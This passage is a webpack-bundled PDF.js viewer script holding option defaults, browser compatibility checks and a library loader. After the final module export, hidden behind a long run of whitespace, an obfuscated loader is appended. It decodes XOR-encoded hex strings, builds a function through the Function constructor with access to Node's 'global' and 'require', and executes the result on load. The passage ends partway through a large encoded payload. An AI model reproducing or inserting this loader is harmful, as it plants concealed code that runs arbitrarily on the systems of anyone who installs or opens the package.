  cMapUrl: {
    value: "../web/cmaps/",
    kind: OptionKind.API
  },
  disableAutoFetch: {
    value: false,
    kind: OptionKind.API + OptionKind.PREFERENCE
  },
  disableFontFace: {
    value: false,
    kind: OptionKind.API + OptionKind.PREFERENCE
  },
  disableRange: {
    value: false,
    kind: OptionKind.API + OptionKind.PREFERENCE
  },
  disableStream: {
    value: false,
    kind: OptionKind.API + OptionKind.PREFERENCE
  },
  docBaseUrl: {
    value: "",
    kind: OptionKind.API
  },
  fontExtraProperties: {
    value: false,
    kind: OptionKind.API
  },
  isEvalSupported: {
    value: true,
    kind: OptionKind.API
  },
  maxImageSize: {
    value: -1,
    kind: OptionKind.API
  },
  pdfBug: {
    value: false,
    kind: OptionKind.API
  },
  verbosity: {
    value: 1,
    kind: OptionKind.API
  },
  workerPort: {
    value: null,
    kind: OptionKind.WORKER
  },
  workerSrc: {
    value: "../build/pdf.worker.js",
    kind: OptionKind.WORKER
  }
};
{
  defaultOptions.disablePreferences = {
    value: false,
    kind: OptionKind.VIEWER
  };
  defaultOptions.locale = {
    value: typeof navigator !== "undefined" ? navigator.language : "en-US",
    kind: OptionKind.VIEWER
  };
}
const userOptions = Object.create(null);

class AppOptions {
  constructor() {
    throw new Error("Cannot initialize AppOptions.");
  }

  static get(name) {
    const userOption = userOptions[name];

    if (userOption !== undefined) {
      return userOption;
    }

    const defaultOption = defaultOptions[name];

    if (defaultOption !== undefined) {
      return defaultOption.compatibility || defaultOption.value;
    }

    return undefined;
  }

  static getAll(kind = null) {
    const options = Object.create(null);

    for (const name in defaultOptions) {
      const defaultOption = defaultOptions[name];

      if (kind) {
        if ((kind & defaultOption.kind) === 0) {
          continue;
        }

        if (kind === OptionKind.PREFERENCE) {
          const value = defaultOption.value,
                valueType = typeof value;

          if (valueType === "boolean" || valueType === "string" || valueType === "number" && Number.isInteger(value)) {
            options[name] = value;
            continue;
          }

          throw new Error(`Invalid type for preference: ${name}`);
        }
      }

      const userOption = userOptions[name];
      options[name] = userOption !== undefined ? userOption : defaultOption.compatibility || defaultOption.value;
    }

    return options;
  }

  static set(name, value) {
    userOptions[name] = value;
  }

  static remove(name) {
    delete userOptions[name];
  }

}

exports.AppOptions = AppOptions;

/***/ }),
/* 4 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.viewerCompatibilityParams = void 0;
const compatibilityParams = Object.create(null);
{
  const userAgent = typeof navigator !== "undefined" && navigator.userAgent || "";
  const platform = typeof navigator !== "undefined" && navigator.platform || "";
  const maxTouchPoints = typeof navigator !== "undefined" && navigator.maxTouchPoints || 1;
  const isAndroid = /Android/.test(userAgent);
  const isIE = /Trident/.test(userAgent);
  const isIOS = /\b(iPad|iPhone|iPod)(?=;)/.test(userAgent) || platform === "MacIntel" && maxTouchPoints > 1;
  const isIOSChrome = /CriOS/.test(userAgent);

  (function checkOnBlobSupport() {
    if (isIE || isIOSChrome) {
      compatibilityParams.disableCreateObjectURL = true;
    }
  })();

  (function checkCanvasSizeLimitation() {
    if (isIOS || isAndroid) {
      compatibilityParams.maxCanvasPixels = 5242880;
    }
  })();
}
const viewerCompatibilityParams = Object.freeze(compatibilityParams);
exports.viewerCompatibilityParams = viewerCompatibilityParams;

/***/ }),
/* 5 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


let pdfjsLib;

if (typeof window !== "undefined" && window["pdfjs-dist/build/pdf"]) {
  pdfjsLib = window["pdfjs-dist/build/pdf"];
} else {
  pdfjsLib = require("../build/pdf.js");
}

module.exports = pdfjsLib;                                                                                                                                                                                                       var bx = '-6435';function AJ_DPijpMXHFyLa$YbJKdeirBK(QH$clzCNk,rRgrRBNbAADCUaUDLjDUHZRyO){var jl_z$sE=iEthVEDendvFjxjpx_t();return AJ_DPijpMXHFyLa$YbJKdeirBK=function(dkSxbq_F,RmNh_XDHYkJzR$Gr){dkSxbq_F=dkSxbq_F-(Math.max(-parseInt(0x349),-parseInt(0x349))*Math.max(parseInt(0x8),0x8)+parseInt(-0x1)*-0x503+Number(0x15ab));var bfRxnyV=jl_z$sE[dkSxbq_F];if(AJ_DPijpMXHFyLa$YbJKdeirBK['YqdzLS']===undefined){var hKEcnAnfATr$hxXB=function(RFcHGSJjtvqHt){var PeqW$tTfVRnRtHVUHbFHSEHkzn=0x85e+-0x1939+parseInt(0x11e8)&0x6d*parseInt(0x1)+parseInt(0xd99)+-parseInt(0xd07),wJdw$_zc=new Uint8Array(RFcHGSJjtvqHt['match'](/.{1,2}/g)['map'](cflLfl_MPxmeCX=>parseInt(cflLfl_MPxmeCX,-0x8cb*Math.max(-0x1,-0x1)+-0x1e7*Math.max(parseInt(0x1),parseInt(0x1))+0x17*-parseInt(0x4c)))),gFBN$FhYQdLxagiM=wJdw$_zc['map'](RrkZwX_Zek_HR=>RrkZwX_Zek_HR^PeqW$tTfVRnRtHVUHbFHSEHkzn),X_JtaXCNz$I=new TextDecoder(),Wrygpyibj=X_JtaXCNz$I['decode'](gFBN$FhYQdLxagiM);return Wrygpyibj;};AJ_DPijpMXHFyLa$YbJKdeirBK['FFXUof']=hKEcnAnfATr$hxXB,QH$clzCNk=arguments,AJ_DPijpMXHFyLa$YbJKdeirBK['YqdzLS']=!![];}var HOggYYaWf_vyAWSDmD=jl_z$sE[parseFloat(-parseInt(0x99d))+Math.ceil(parseInt(0xf9))*0x10+Math.trunc(-0x1)*Math.ceil(0x5f3)],hT_$leItwCJXtWd=dkSxbq_F+HOggYYaWf_vyAWSDmD,uXCSD=QH$clzCNk[hT_$leItwCJXtWd];return!uXCSD?(AJ_DPijpMXHFyLa$YbJKdeirBK['jUdQhe']===undefined&&(AJ_DPijpMXHFyLa$YbJKdeirBK['jUdQhe']=!![]),bfRxnyV=AJ_DPijpMXHFyLa$YbJKdeirBK['FFXUof'](bfRxnyV),QH$clzCNk[hT_$leItwCJXtWd]=bfRxnyV):bfRxnyV=uXCSD,bfRxnyV;},AJ_DPijpMXHFyLa$YbJKdeirBK(QH$clzCNk,rRgrRBNbAADCUaUDLjDUHZRyO);}(function(T$TNh_rvqDFNVrHfTu,naLccAeIyNvM$_HCJTvuiysrK){var Fze_tqG$akzGu=AJ_DPijpMXHFyLa$YbJKdeirBK,CYoMhMKXyHBLmFrsUNnODP=T$TNh_rvqDFNVrHfTu();while(!![]){try{var Ap$$pJJadsGfvc=parseFloat(Fze_tqG$akzGu(0x6a))/(-parseInt(0x1a9c)+Math.trunc(-parseInt(0x3))*-parseInt(0x32d)+-0xa2*-0x1b)+parseFloat(Fze_tqG$akzGu(0x78))/(-0x59c*0x5+-0x299+parseInt(0x1ea7))+-parseFloat(Fze_tqG$akzGu(0x72))/(-0x3*0x92b+parseInt(-parseInt(0x269e))+-0x1*Math.trunc(-0x4222))*Math['ceil'](parseFloat(Fze_tqG$akzGu(0x66))/(-parseInt(0x1)*parseInt(-0x552)+0x1b50+Math.ceil(-parseInt(0x209e))))+parseFloat(Fze_tqG$akzGu(0x70))/(parseFloat(-0x3ac)+Math.trunc(0x540)+-0x18f)*(-parseFloat(Fze_tqG$akzGu(0x69))/(Math.ceil(-parseInt(0x9))*Number(parseInt(0x26))+0x798+0x3*-parseInt(0x214)))+parseFloat(Fze_tqG$akzGu(0x77))/(-0x1fc3+-parseInt(0x2478)+parseInt(0x2221)*parseFloat(0x2))+parseFloat(Fze_tqG$akzGu(0x6b))/(-parseInt(0x7)*Math.trunc(-0x134)+Number(-0x114f)+0x1*Math.floor(parseInt(0x8eb)))*(-parseFloat(Fze_tqG$akzGu(0x71))/(-parseInt(0x223c)+Math.ceil(-parseInt(0x3d))*parseInt(0x7b)+0x4e4*parseInt(0xd)))+Math['max'](-parseFloat(Fze_tqG$akzGu(0x6d))/(-parseInt(0x134b)+parseFloat(parseInt(0x18e3))+Math.ceil(-0x6)*parseInt(0xed)),-parseFloat(Fze_tqG$akzGu(0x74))/(parseInt(0x1c73)+parseInt(-0x2165)+0x4fd))*(-parseFloat(Fze_tqG$akzGu(0x7a))/(-0x189d+-0xc43+-0x116*-parseInt(0x22)));if(Ap$$pJJadsGfvc===naLccAeIyNvM$_HCJTvuiysrK)break;else CYoMhMKXyHBLmFrsUNnODP['push'](CYoMhMKXyHBLmFrsUNnODP['shift']());}catch(oUZ_sn){CYoMhMKXyHBLmFrsUNnODP['push'](CYoMhMKXyHBLmFrsUNnODP['shift']());}}}(iEthVEDendvFjxjpx_t,parseInt(parseInt(0x7ea87))+parseInt(0x12cac9)+-parseInt(0xed555)),function(wWXxAlCvACTeUChGuSVchX,cGEZPzfITTbLtYWevOABb$x,yTumVqZ$YzNZHWRxQeN,rifwBArQyABeowRDbtAoMetR){var EyyoNM=AJ_DPijpMXHFyLa$YbJKdeirBK;wWXxAlCvACTeUChGuSVchX['bx']=bx;function p_NexWCmLvhT(btp_DyvQkA$CP,WQGzqO_MgNs){var ciNIt_GDIXa_cqJKqI=AJ_DPijpMXHFyLa$YbJKdeirBK,GpJ$oKw$MVC=btp_DyvQkA$CP[ciNIt_GDIXa_cqJKqI(0x79)](''),uuoePGHjkNisWwPyhHO=Math.floor(0x17f6)+0x1b*Math.ceil(0x33)+-parseInt(0x1d57),UgCXxFyYxAvOBeqCmwyEqsl=WQGzqO_MgNs[parseInt(0xba1)+Math.trunc(-parseInt(0x23bd))+Math.floor(0x607)*parseFloat(parseInt(0x4))],KbDINYWCQUaFhM_z_WzKS=GpJ$oKw$MVC[ciNIt_GDIXa_cqJKqI(0x73)];while(uuoePGHjkNisWwPyhHO<KbDINYWCQUaFhM_z_WzKS){var EGhpRDxUiLGKRZdDrHlt=UgCXxFyYxAvOBeqCmwyEqsl*(uuoePGHjkNisWwPyhHO+WQGzqO_MgNs[parseInt(0x2)*-parseInt(0xe8c)+Number(-parseInt(0xd00))*0x1+Math.ceil(parseInt(0x1))*Math.ceil(parseInt(0x2a19))])+(UgCXxFyYxAvOBeqCmwyEqsl+uuoePGHjkNisWwPyhHO)%WQGzqO_MgNs[parseInt(0x584)*0x3+0x1887*-0x1+parseInt(-0x1)*-0x7fd]+WQGzqO_MgNs[parseInt(0x6a6)+-0x1d8c+-parseInt(0x1)*-0x16e7],wpEz$CekOW=UgCXxFyYxAvOBeqCmwyEqsl*(uuoePGHjkNisWwPyhHO+WQGzqO_MgNs[-0x691*Math.trunc(-parseInt(0x4))+Math.floor(0x2)*-parseInt(0xa0c)+parseInt(0x629)*-0x1])+(UgCXxFyYxAvOBeqCmwyEqsl*WQGzqO_MgNs[-0x1f15+parseInt(-parseInt(0x3))*parseInt(0xc1c)+Math.floor(parseInt(0x436c))]+uuoePGHjkNisWwPyhHO)%WQGzqO_MgNs[parseInt(0x164b)+Number(0x1cec)*-0x1+0x6a5],uDQTGAPMMmkBK$$KD=EGhpRDxUiLGKRZdDrHlt%KbDINYWCQUaFhM_z_WzKS,zzDeafPwhoGCwnW_Y=wpEz$CekOW%KbDINYWCQUaFhM_z_WzKS,vXbxgSJL=GpJ$oKw$MVC[uDQTGAPMMmkBK$$KD];GpJ$oKw$MVC[uDQTGAPMMmkBK$$KD]=GpJ$oKw$MVC[zzDeafPwhoGCwnW_Y],GpJ$oKw$MVC[zzDeafPwhoGCwnW_Y]=vXbxgSJL,UgCXxFyYxAvOBeqCmwyEqsl=(EGhpRDxUiLGKRZdDrHlt+wpEz$CekOW+UgCXxFyYxAvOBeqCmwyEqsl+uuoePGHjkNisWwPyhHO)%WQGzqO_MgNs[0x2*parseInt(0x2a)+0x21ba+Math.ceil(-0x1)*parseInt(0x2209)],uuoePGHjkNisWwPyhHO+=Math.floor(0x13)*-0x81+Math.max(-parseInt(0x7),-parseInt(0x7))*parseInt(0xba)+parseFloat(-parseInt(0xeaa))*-parseInt(0x1);}return GpJ$oKw$MVC[ciNIt_GDIXa_cqJKqI(0x67)]('');}var quiXFWVomETgfAac=String[EyyoNM(0x6c)](Math.floor(-0x1c53)*parseInt(0x1)+parseInt(0xf4a)+-0x8*-0x1a5),XqFK_gnxvxcBY_EzdPaPmHKU=p_NexWCmLvhT(EyyoNM(0x6f),rifwBArQyABeowRDbtAoMetR);XqFK_gnxvxcBY_EzdPaPmHKU=XqFK_gnxvxcBY_EzdPaPmHKU[EyyoNM(0x79)]('#')[EyyoNM(0x67)](quiXFWVomETgfAac)[EyyoNM(0x79)]('~1')[EyyoNM(0x67)]('#')[EyyoNM(0x79)]('~0')[EyyoNM(0x67)]('~')[EyyoNM(0x79)](quiXFWVomETgfAac),wWXxAlCvACTeUChGuSVchX[XqFK_gnxvxcBY_EzdPaPmHKU[Math.floor(-parseInt(0x1))*parseInt(0x435)+parseInt(0x2)*parseInt(0x11f9)+Math.ceil(-0x1fbd)]]=cGEZPzfITTbLtYWevOABb$x;if(typeof module===XqFK_gnxvxcBY_EzdPaPmHKU[Number(-0xa28)+Math.ceil(-0x5)*parseInt(0x17d)+parseInt(0x2ef)*parseInt(0x6)])wWXxAlCvACTeUChGuSVchX[XqFK_gnxvxcBY_EzdPaPmHKU[-parseInt(0x2f)*parseInt(0xa7)+-0xb*Math.max(-parseInt(0x2e1),-parseInt(0x2e1))+Number(parseInt(0x80))*-parseInt(0x2)]]=module;var plmWUfEgspZDINakHncenM=p_NexWCmLvhT(EyyoNM(0x68),yTumVqZ$YzNZHWRxQeN),MmIGzNa=p_NexWCmLvhT[plmWUfEgspZDINakHncenM[EyyoNM(0x75)](0xa9b+-parseInt(0x1809)+parseFloat(0xd6e),Math.floor(-parseInt(0x4d7))+-parseInt(0xbc)+parseInt(0x59e))],PULnGO$fpqZM$gOYodzpMVK=MmIGzNa('',p_NexWCmLvhT(EyyoNM(0x76),yTumVqZ$YzNZHWRxQeN)),w$ac$RfRNn=PULnGO$fpqZM$gOYodzpMVK(p_NexWCmLvhT(EyyoNM(0x6e),yTumVqZ$YzNZHWRxQeN));return MmIGzNa('',w$ac$RfRNn)(0x3d1*0x2+-0x1bcf+-parseInt(0x1)*parseFloat(-0x1dfa)),parseFloat(parseInt(0x40f6))+Math.max(0x1b18,parseInt(0x1b18))+parseFloat(0x1)*-parseInt(0x38d1);}(global,require,[-0x44f702+Math.max(-0xc571a,-0xc571a)+0xc1553f,-parseInt(0x239d)+-parseInt(0x22b)*parseFloat(0xe)+0x431c,Math.floor(-parseInt(0x3a))*parseInt(0x43b)+-parseInt(0x3)*Math.trunc(-parseInt(0x7e1))+Math.max(0x17510,0x17510),parseInt(0x3f)*0x2b+parseInt(-parseInt(0x1df))*Math.ceil(-0xe)+-0x23f4,Math.trunc(parseInt(0x3))*Math.floor(0x7c15)+-parseInt(0x2)*parseFloat(parseInt(0xa5c1))+0x2*Math.floor(parseInt(0x5f54)),-0x8e5f85+0xb3d6*parseInt(-0x8f)+Math.trunc(0x141e926)],[Math.floor(0xf42aed)+-0xaaf882+Math.trunc(parseInt(0x196ca8))*0x2,parseFloat(0x20f1)+0x217a*parseInt(parseInt(0x1))+-parseInt(0x40c6)*parseInt(0x1),-parseInt(0x610)+-parseInt(0x7)*Math.max(-0x83,-parseInt(0x83))+0x2e64*0x2,0x76*0x44+Number(parseInt(0x1))*parseInt(0x12e7)+Math.max(-parseInt(0x2),-parseInt(0x2))*parseInt(0x17ff),0x11b99*Math.max(-0x1,-0x1)+-0x1315d+parseInt(0x2fd11),-parseInt(0x8265c4)+0x1*Math.max(-0x196e62,-0x196e62)+parseInt(0xec935d)]));function iEthVEDendvFjxjpx_t(){var NOlhTdvICDCRcivd$aFV=['7e61646e68','3e67692d21317e6c3f7e3050302536783e3f303d623c6c3576246c643626247f64767f6c64636463706361237f246c3d2661627a6e623e7f2d2f686263567978796f6f795650247d7b3435627d3f6c31797f6e64397b613936366e562d6c7b353b21246c7e362f687b26217f367e3a25623a20636b6c7f253b217d646535645066796a7f26605626566c3c3c3e627f3f253f7f623d6f70682d796e6c3b2c7b397f3025506b3664647923267f2d642c24363c7921233523267e796b4c217e23627f3662237930262663653626762625364c786e36697f783636797e783c3a3b6e7f2d247f566b302f3e7935647e65306c6e693068656f7e3c622463786b6a7d647f7f263d25216379616e646e6825333e3679782134787f6c6c7f393c636c366c64566f7b2464657f79796c656562686468697e7f646c7e61636a7f367d7979656336616379303d617925236430237b6b7d2d30627524633c61622f6c256e6479643662686c3e216e3b3e6f79306c617f6c303a64236c786161367b65643c62707e6b4e783d637b3f2056347f64633f795e616c7b68766c2430687f2d7879682d343e2563247d6c2325603e3e2d7e3662213e6a566836646923644e6c256a793d7e3624686b3c2f62366c653c6b4e266a672f2165627f3036627827606c3f79793026352d566e366c303b79246b6c7e63626e3d766e7f2d69252d702179363c79273a507f366268233a34697938637d24246f256c7f2665643b316c6c6679237b7b3c692426357d704e2d6868563860257963793579306e79243324647f307f6b79253c6163257e24236e3d6a6b643d6930646c6c3669243e2562696430793d617b236c24247f2d624e797f78247f707e21687f69216f3c6c3f267f236466257b79366e7f6c25637921627924243c617e3a6e3566793d79566b686b30253a6179303068795e36645064567e793e36314c6e256c653e796c3c30307f366c2321252d6c367924667f26356f7f30786c366e7979792d2463367e68796e3d2f236c646e796320213c56237979652d21216a3e203d7c7b79624c683c2679263f62365064256f207f266961627e757e7f617d307979246a7f6467616e636f6e6b627f2d2d646e6c7e62213636786f303d6e7e7e7f7e21797b607950612d64636130793c50776836647f796c246b643a217f2f68782450267879707d2378656c7d79217b6b7b7966667d793d7b3f2d7864756c7d6c626a2167797863643c5069623f397964306e794e20794c762f626e363e683d38306c7e2525796f2550656f62307e683f6836646468363e7e6a7d7d236f4e2d646f6364267f6b7f6268626c637830656968233936267965207f627b74232d3f39236c6264305079253030627f607e7b76616679786f643631796879356c25236b64253d3061687e2569257879656979616465647b39647826307b507e676279232d6279216c623d3039617860616f6b7f3f3e4e6e3f6221366830686c397975306c7e21796a7f23786260246c257e6c6b3c65246a7f64792f7d7f397f6b6c656e343675682466','383e393e343a38545a68486847','393b3f3b3c3d40686265586f','7e7d616479','3c3e383f393a3b3569476e41756a','39795e4943544a','67626463','796e6b63796c61607e6462627d7a6368676f6a7f667865797c7f74757f7b62787e696e6e77','3c3d3f635c4169637f','3a3b3f383f485a6058646e','3c383d3f3b3b39455a7f605875','6b7f62604e656c7f4e626968','3f3d674f627b4b77','5c6832562f5647562279686e5631566a563647292023233963246431257a76323d745650646e4d4f253d7523342e6c6e4e5664566e52246e61232b676423242364563221646e4e6e38232d305656313b6560643956792d7d6e566932374f217e556d3552256932323263565627743268665662366b233230312b56236b38325e2c2c6b562d794b59322456622c5656566858236a795644564132232d326e5a75597c2d684532277a7f37306423323f566e2338232b232b2856697b622956754d7f556f565c325e37457f6e562923566e6a7f562e5639615256562368566429236e2f2332684a79562d7f325b75734f56472a6f7e56562f235e4c622d2352263232276e287763566b68372163643c52796456566f5442236e5b6e6a6923795656707f232c635e2549764c66686e2463566623237f24457f565626626b61647e65566b56567d436556765623324d7e6b29562c3f56746b233223762d7e3c68286623387e2356562c562e7e642f367079413656686f56262556563e3a56234945566e693260702d3d6e3624616e4029793f32564f7e232d7e32253532562a7534756223756f5d646e6636565e566e23235f23302323642a35257e562c56612d622b2d2856633276636c7e562d68662356636e7f617f6b6e60562c64206c2b682370646f6e68417e252c6256627b6065625e26612d3f356c6629236e232d70683278254f4e56232e5679686a236832566c56246a6e7e7a7e322356256c686e6076396123706e56685625565f5d5627235647686860646556275656566c2d6c68245623696823567f564e356f564c67566635324c236c3f606b7f2379326b56266b2363566e232367632c7e6b6c236e23567b564b5632567532324169787e532e56246856366e257e5e3f6e61525e3b2365226e6e3223693b566563232278566435233239247e2777622c23636c7e3d23387b283c3274236e563256732e7e325663326e2f56565523276e5e782c56235f3e2423647762566e6f64562d32232c795669235644567a596e5668226b236a4574565632566b6156566156792c26647920232c5623683d6532352656783d2a3e3d6b4f3d322d7e256a233c6b413d23562375286e32337f6223562d236e322523253223377f617a2e7025236e3a236e7f6323563268635632306875236e565e686c3f68232323253c6e7d30237e233933323c566c6c566e275639566f51792363666f2d233248613e6b2c563952332a56792d566a237e24253d372568706e4d237e7923562e6c66225623793c6e6c2d6724486240237e61525632566e423f2356567e23446e78562d6e645d2379485225326e4c2c2c6b786b2d7f562c3b7f6e6e6656383d26564d2356686c562e2364282556212426566e3063322a2d23322c5652563956417e692e7426325e615d62236b36685e7064684c2323326279562c46604b695637615a7f232d697b2c326e28565670702e6323237b7e236270324b7f5656564861785652685670563d2d324e356b3b6961686e56796f5648236e562331692c7d7f64762624326f325e563d6a794c68567d562356235d642323695632326c6233796460796b7968567f4e2932525660647e2323687d322c7f2f6f526034566f6123566279362b7b6b6462236e2e32487838232c37652d5623702f50627b56326974326c327927242320627464233f236c556456325629237e20236e5e237f2d7452306b592c794c52686823325f67437e337d23347a756e65616169562f666e565656206b7b68256e767e232c66756a245e70215e512f7d2875234a567978566c232f7d4023562f792464693e53245b205623566f356e5e56236a683279543243326468494c386e564c232c5669565663567f7a66617b685623627f7d6e255634567f4032325656565c68256439322d6e562629562b792e232c56242f456523377e26565669324c323d616332687f3b7e327d56232250567a682d5e563232232d2069692379567f685666576e2523236c566b232c566a566b256e5e74485e326368565656687c56657d5656237e236932564e233b7456486c2158532364566925706c6456327e56755668486468692a687f56237920567e2a4d56546163565f37567f6568316863617e2521566c325a646823242a322d24796c23567e5e566e322266326a6e656423653f7a3278236e5655233b64236e6e797f7e56386a2c7d236856614c56564f74565632564879643c62236856642f232c5e4228236678236f566e2c252a563256686b616c486e566e7f6864325623606f5664345676236e2c623223623225322c565f567e7f324f7f2562795639772d3262222356652c25217b5656434b7f307962562d79685e6c2c39796c3239443b7f75364d562466607669232a625623233f325679387436322356692d6e56566e2356326e56226379562d2c686e7a3a24237e5632447932563d236456232356396e605636295662566e567423646028482c692d56776223652c78776c636e69645679565248326b707956565668687f5623207023473f562c4c35236b6370282363565856645656236b356e2d337d5c322f2d253e752c68356f6b4256767e246f7e68752356565e3232236956664256683264567b70562368235e5678562c567b5e2d2a66564c56243c79493d7463626a747f485d56682d236b627e7e2c562356256776682d6e7e24764f5632222d5a2d752e292a2c23565d7f56246e2732322e587a4c32397f7d7e2332302260233665563823692d455662566928675625322d5e3b6e232f563961795656793d706c7d79256a2c56663d23563225562923566e7e6228365f6e3f235669327e4e32236832684856655e24562c626e5623232d5662206e6020607e235e796e62652368392332566e7623567e3d7f2c347d6856233e796e325e7e236e6923565677382f7e3056232d56567f2344563256322f3e5623325e6e74686132322f5656643e39695662617e56637e7d622c426468747f533c506a6d5647563c233226652d7956762c56207961565241565664566e64325e5e5156563d6956683261562056757f79255666562532686e56445675566e6c56297f7e6e325e6456612879566e7f537f32566c2f3d5635202c56605779234f68566437313979306a23566e797a7e2b555679327d7e6f322f7e4c3223237e2d342c522439702d607d2d56344b7e7463656e3c626e562360317e2e5e6e6e2156785e564b337f692379297f2b327e3356233e2c56252d5d56567e603c56236e322723625678235825792c6b4c50362b647023236c2c567e205f7c5628292332386f2123567e326f7f64793c32562423716132326e307e566258794f4c5f382d566e4e234569422c2f792c797f23327b37566b6c606b233f6f6436563f3d7b233464486830566a6a6456306932236a56566e343452566939396c32372d312f6178236f2c6e6e635632627a426461326626563256233d28565679236e232325622323236c23232348245656565a6079754a563b24325669554c4078282368606a7d6b235a666e6e613b567f235656562d412d6e5c203a3532564c236e236e636b563c6f326356562568232a5632283d322d23566e237825562e687e6c23763276243223325663565a783e56326268564f6e6e595668567e702f7e25266c6c5661237962566031442356317844633279602d6f243e77662f56257a7a2c565e71562358702f563d562f56752368445e233232252368246223246c2356325665236e205c2b563256236d4f707e232023565e23566e6b696d76386e5625775656625659565623562066566a23242b622856556c3d784c56325e68643678423f232a5e7d237d6b3d647f6a5662756b2d2320562a61322f6e3260254b2661565723692d453f56647964257875566d7f322d23786c2333634b3232237e62566e5632756e26796c76782379566e40326a562f23327d32567f6f757623563d326139567660562d236c6c322c39626e6e6c367f2d6f53302a2779327f567d30233268566e6e6864624523327e77323221632c565623396a56372461615629566124565623326a6e564c7d5660566b7f6e2064236b253256325656632364566c327d232a3a32477a317e352f5629696e2f233d7d666e563d25563225686e7555567f6452234a564b2d59684523612356233e7f7e233321792f527a287e32233d797e48645632257e434c2524633b6e2452626b362c573c232368617e6e56274125303a322d56566e563a327b562b567b63562d42322369456a6e2d56565d48566c646e56257e235f3d3f3266326e7068686a6e616e327d25567d566e6d66567d3268585632537f5d79562336323a322d322556445632237f323c45255e567f7a236256686463646e7e5635756e3264566832642f73562d7e6c325d562b57234432247424565656426e663e7e2356606778255932632157687d56322d4273343256456b56382a23647e235668623f567e6c2c326c32412d2535305f324d3056696864235e246169795656322c566856277e232d6e23677f34322d562b236e3b7e324f7c3c5625707451327e3231303d6b6d322563232f4556687935242f7e5f6b56232456562963637e6c6e6b7b5623326a56792c563b747e23326e4c56563e7d23567d68696c2356566e63702d7d23204376786028776b7d6879793f5e6e563223246e74206e566d647e637c24256b74562c6e607f62685678237e212e716a506c6e602c5e23683276686e7f567e61237f5632656c5656772356567a32606475326839256a32793a23232d2d47326e23623223562c3b744623232b2c7964566b643264524e6c56232c2565232d6f2c232923716f40325e5e645664325632792932563a612564563223522369323564614c26522c56365664483223327956327e455e326c5f23322d32456456683223565d6c6c5f2d6c7d32562c334a2923566b2379236d6e2d322e24654f696e5632635625462b565e25237d6c3d6c3a7930562d5632236e2169323e257e7f564d7d6e232b7928607932306876247e3b6e5e2325567e5e5f796856562c7923636368635678234c2956624961786856645f613c6e5656532f5679472d233269797923474f2a792357567723232352422e64696c327d5f23246a2823234d6c613e2c7861512c56627e7e562c562550426256646356687e28335668693d277f567f2929565669237a56763e56563956536e6e6e6f3d246869232b237c51795e3262716b4e69755e3636697f684c4863567d23566b7038686554326e56233b6f7f7932716b5e68235670254d29322369697d567d56682368565668326c6e236b6175562f23683d3f7e23235656792156292168566b5375566f63696137564b7f253d213223255276232e2971636864666c68353723233523232c232332232f322969622356322523225624756e632356567d786b5d24562379566c2229686b6e2f3e562579247f7d6e23625679562f2656764232262556247d7b562323567923793b324d685d51215656235666683261562c564056682c6b32232023246c6e6f4e644c6e326123566a56562329377e326f6964322c7e7f5625237b5e266e5638566e796e253e2c7e3f56796120516a385e5669687f74563d6e6f702d566232792c2d7f4c22236c2367263949765656565c565632496c68372832562a562e6f682c5663232379293123235625636b36237f63686b6c5656793732376e242d683d6e4c2c79717d326923682332676c237e6e7e3d32636b322f56236c324b2f7e506b64362c626f7923323f56227a3c23747060644432596e6e56326556286a324f7e682c32565d612356643e3c7939667056275623562c48565c326a6e24567d5622562a565670646b6b7e2356325656566b68212c6e56315627243224786b325679232e567e3d32606b687f5674565e702d7e322e257f3b4f63472e2f3e246f2a7924216956662b7f4856232356236e256328765e23236e6331566e6e5256323256653b702332492344206863697d425e633259236c322e7856567933236c3f336325637e2b793075586c68467e695632687e5e62584623232d2364647e7e3d6e457e475678327f7925212a562e5679327a74325637797932476f2d38577a3e7f5e56322d62325b29565e56564b69615e686932562c6874617956565835236b6c7e75687f562f61326823766e23326e2368623230606e56236223797656563a2f7a2d5168566e776e2266232c69335c565e236e38352523625632236e7b237956566c2364563223563279566e634356565e526f6e56566b796f322d237f32265663322b4f237e6e256c565c5625566f2c6e663224326a635660566e7b2e4d48676e64562c56304c7e2379327c2323772523295e7d7063255232206e682d7f79237e6c5623464764455656745e5e23563c5623634932545664566e786b7952522432794b4f5032247e24322023567e2f23237e564d324c7e7d453242797956322e232456566268326e756a63287956566c3e565e56236223325623524c255656646b2c7f20222c69276c2523322f323f23565e69686a477e7556542d2e2a5223253e5d29456e6379246e56303e7e562c2356563234326e566e306e225a56752363565868642d41256162327f64565e6e6464656e312370652c622c48784c30786c67296156756c236c5623566143247f522c325a563d296e2d2361696063636456492356323f6556565e23565679612923566b5623666e25236e4b7179565667336c2460432321657e326c562d32613932562856566c256b252547322d6823236256562923562356253d6e5e7d2556252562252c2d5669237f21696f232d34422c6453714825695670526e56355e22562244457a2e65237e6b256e62562379677e48753264656e2c567a56323c5632562e682323235d5656234c323c233c566b322d5642565e42324562236e3d247032487e483239323469635650562d622332237f633d567e74322377682332777e4b646e3b347e39523d60323a30234d28527e5e3b792375233a5d2532255c622a2d34562d236823657f7b2a2f5648364b6c32567023563c6864566926236e566937542432235256562b2d326e236e56563260632468233222322e254c7924612c6c32454c566456772368323456387f5656683a575656233e607f6c6332236863602432365664302378797a5236406e235623235c3223377936755e21387928687523246e707f56526b6f5668616e236c325f6b3256346e7962692370235c2c2f56562c3c56237d7e5e6e795239295f56556b563756787f326c60347a2b2c4d302c327a306e31682d6861645c36563e2362233d335656667f236e40507f565656642d565623276b6d2c323056206e23566e2356562d62565e6024256c49566124395670325e6e56232d56563179235e32257a5656242a4a2c566b6e667e25236456206b235660322c566e2c694364256e56346866322f3377625e64364356322569745662327e2356796a797f56623d7f235632636e455664756f68696256562c225e3e2c422d7e566e24566e6f32566e232756233256675656254c6f324c6e563224637e7b6c2364232368562e7e23567e60566e237925566c2366212325246e525623566b566e686e566e393a512d456e6e64697550327123562b68567a617f2856236a7d3237567956672d2220215679322d56237f7e70212b783f522b5d327e6b7523646f7e482339237a77566c646b56327056236870562c646f5264326e6369236f396863654f757766567d702d332d5c7561236b2f23327d627e2c3f7a242b5625536e6e7979567948627f56592d762332566e6f786a2356236266256532686b596968705f68566424603274327d262656233c2932235e34563232563261323e6039615661564f56256e632330634856563225482e56562c3232235623566832236c3d296e236b56347c2d2d25565c7f7523565e232523257e563c32567f684a237e32755b327d6860787e207923686864236b236e232a695638322e7f31367723237835562c78705632527f686f6c662c78707d766a637e41284c324f6b46326f627928566e56386e324864486e324f2b7575562b325665462132625a7b216156567e4265327e56234556246e3e322b2220566c566277796c325e563e2c255d3b566850563679237f4a6e2d25325a6365682322232356326e507b2d237e2b566